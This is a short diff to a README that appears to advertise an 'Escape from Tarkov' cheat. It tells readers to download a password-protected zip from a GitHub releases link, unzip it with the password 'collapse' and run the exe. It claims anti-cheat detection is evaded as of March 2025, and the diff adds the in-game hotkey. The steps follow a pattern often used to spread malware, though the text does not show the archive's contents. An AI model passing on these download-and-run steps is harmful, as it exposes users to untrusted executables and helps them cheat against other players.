@@ -3,6 +3,7 @@
 >https://github.com/SimmmBo/EscapefromTarkov_CollapseCheat/releases/download/last/collapse_updated.zip**
 >**unzip it (***Pass: collapse***)**
 >**run the exe file (if it doesn't work, write to the developer)**
+>**In game key HOME**
 
 <p>Status - Undetected (30.03.2025)</p>
 <p>Supported processors: Intel, AMD</p>
